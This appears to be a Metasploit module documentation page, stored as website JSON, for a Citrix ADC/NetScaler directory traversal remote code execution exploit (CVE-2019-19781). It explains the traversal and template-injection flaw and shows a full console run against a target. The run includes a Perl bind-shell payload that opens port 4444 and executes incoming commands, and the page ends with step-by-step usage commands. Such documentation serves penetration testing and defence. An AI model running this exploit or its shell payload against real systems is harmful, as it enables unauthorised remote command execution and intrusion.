{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/citrix_dir_traversal_rce","result":{"data":{"moduleMetadataJson":{"id":"f0df5f30-e102-5120-96d4-58ce07307135","name":"Citrix ADC (NetScaler) Directory Traversal RCE","fullname":"exploit/linux/http/citrix_dir_traversal_rce","description":"This module exploits a directory traversal in Citrix Application Delivery Controller (ADC), aka\n        NetScaler, and Gateway 10.5, 11.1, 12.0, 12.1, and 13.0, to execute an arbitrary command payload.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/citrix_dir_traversal_rce","documentationSlug":"/modules/documentation/exploit/linux/http/citrix_dir_traversal_rce","referencesSlug":"/modules/references/exploit/linux/http/citrix_dir_traversal_rce"},"documentation":{"html":"<h2 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h2>\n<p>A directory traversal was discovered in Citrix Application Delivery Controller (ADC), aka NetScaler, and Gateway 10.5, 11.1, 12.0, 12.1, and 13.0.</p>\n<p>When the NSPPE receives a request for <code class=\"language-text\">GET /vpn/index.html</code>, it is supposed to send this request to Apache, which processes it. However, by making the request <code class=\"language-text\">GET /vpn/../vpns/</code> (which is not sanitized), Apache transforms the route into <code class=\"language-text\">GET /vpns/</code> and processes this last request normally.</p>\n<p>This <code class=\"language-text\">/vpns/</code> directory is interesting because it contains Perl code. The script <code class=\"language-text\">newbm.pl</code> creates an array containing information from several parameters, then calls the <code class=\"language-text\">filewrite</code> function, which writes the content to an XML file on disk.</p>\n<p>A malicious attacker can execute arbitrary commands remotely by creating a corrupted XML file that uses the Perl Template Toolkit in part of payload.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(linux/http/citrix_dir_traversal_rce) &gt; run\n\n[*] Using auxiliary/scanner/http/citrix_dir_traversal as check\n[+] http://127.0.0.1:8080/vpn/../vpns/cfg/smb.conf - The target is vulnerable to CVE-2019-19781.\n[+] Obtained HTTP response code 200 for http://127.0.0.1:8080/vpn/../vpns/cfg/smb.conf. This means that access to /vpn/../vpns/cfg/smb.conf was obtained via directory traversal.\n[*] Scanned 1 of 1 hosts (100% complete)\n[+] The target appears to be vulnerable\n[*] Yeeting cmd/unix/generic payload at 127.0.0.1:8080\n[*] Generated payload: id\nuid=65534(nobody) gid=65534(nobody) groups=65534(nobody)\n\n[!] This exploit may require manual cleanup of &#39;/netscaler/portal/templates/mdjLHiHtIYmh.xml&#39; on the target\n[!] This exploit may require manual cleanup of &#39;/var/tmp/netscaler/portal/templates/mdjLHiHtIYmh.xml.ttc2&#39; on the target\n[*] Exploit completed, but no session was created.\nmsf5 exploit(linux/http/citrix_dir_traversal_rce) &gt; set payload cmd/unix/bind_perl\npayload =&gt; cmd/unix/bind_perl\nmsf5 exploit(linux/http/citrix_dir_traversal_rce) &gt; run\n\n[*] Using auxiliary/scanner/http/citrix_dir_traversal as check\n[+] http://127.0.0.1:8080/vpn/../vpns/cfg/smb.conf - The target is vulnerable to CVE-2019-19781.\n[+] Obtained HTTP response code 200 for http://127.0.0.1:8080/vpn/../vpns/cfg/smb.conf. This means that access to /vpn/../vpns/cfg/smb.conf was obtained via directory traversal.\n[*] Scanned 1 of 1 hosts (100% complete)\n[+] The target appears to be vulnerable\n[*] Yeeting cmd/unix/bind_perl payload at 127.0.0.1:8080\n[*] Generated payload: perl -MIO -e &#39;$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)-&gt;accept;$~-&gt;fdopen($c,w);STDIN-&gt;fdopen($c,r);while(&lt;&gt;){if($_=~ /(.*)/){system $1;}};&#39;\n[!] No response to GET KdlZHSNjZQzdSCKAusgAnnbPvTMLhXRxiEydEotJP.xml request\n[*] Started bind TCP handler against 127.0.0.1:4444\n[*] Command shell session 1 opened (127.0.0.1:51106 -&gt; 127.0.0.1:4444) at 2020-01-13 20:50:45 -0600\n[+] Deleted /netscaler/portal/templates/KdlZHSNjZQzdSCKAusgAnnbPvTMLhXRxiEydEotJP.xml\n[+] Deleted /var/tmp/netscaler/portal/templates/KdlZHSNjZQzdSCKAusgAnnbPvTMLhXRxiEydEotJP.xml.ttc2\n\nid\nuid=65534(nobody) gid=65534(nobody) groups=65534(nobody)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the module as usual</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/linux/http/citrix_dir_traversal_rce</code></li>\n<li>Do: <code class=\"language-text\">set RHOSTS [IP]</code></li>\n<li>Do: <code class=\"language-text\">set LHOST [IP]</code></li>\n<li>Do: <code class=\"language-text\">set VERBOSE true</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n</ol>\n<h2 id=\"targets\" style=\"position:relative;\"><a href=\"#targets\" aria-label=\"targets permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Targets</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">Id  Name\n--  ----\n0   Python\n1   Unix Command</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"advanced-options\" style=\"position:relative;\"><a href=\"#advanced-options\" aria-label=\"advanced options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Advanced options</h2>\n<p><strong>ForceExploit</strong></p>\n<p>Override check result.</p>\n<h2 id=\"references\" style=\"position:relative;\"><a href=\"#references\" aria-label=\"references permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>References</h2>\n<ol>\n<li><a href=\"https://www.mdsec.co.uk/2020/01/deep-dive-to-citrix-adc-remote-code-execution-cve-2019-19781/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://www.mdsec.co.uk/2020/01/deep-dive-to-citrix-adc-remote-code-execution-cve-2019-19781/</a></li>\n<li><a href=\"https://www.exploit-db.com/exploits/47901\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://www.exploit-db.com/exploits/47901</a></li>\n<li><a href=\"https://www.exploit-db.com/exploits/47902\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://www.exploit-db.com/exploits/47902</a></li>\n</ol>"}}},"pageContext":{"id":"f0df5f30-e102-5120-96d4-58ce07307135"}}}